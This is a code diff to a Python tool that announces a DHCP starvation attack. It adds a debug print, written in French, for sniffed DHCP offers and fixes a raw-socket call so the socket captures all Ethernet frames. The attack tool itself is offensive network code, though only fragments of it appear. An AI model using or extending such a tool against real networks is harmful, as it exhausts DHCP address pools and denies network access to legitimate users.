@@ -432,6 +432,8 @@ def _sniff_dhcp_offers(stop_event, s):
             frame = s.recv(4096)
             result = parse_dhcp_offer(frame)
             if result:
+                if args.very_verbose:
+                    print(f"[DEBUG] OFFER reçu → {result}")
                 xid = result["xid"]
                 offered_ip = result["offered_ip"]
                 server_ip = result["server_ip"]
@@ -451,7 +453,7 @@ def _sniff_dhcp_offers(stop_event, s):
 
 def dhcp_starvation():
     print("[+] Starting DHCP Starvation attack ...")
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
     s.bind((args.interface, 0))
     stop_event = threading.Event()
     sender_thread = threading.Thread(
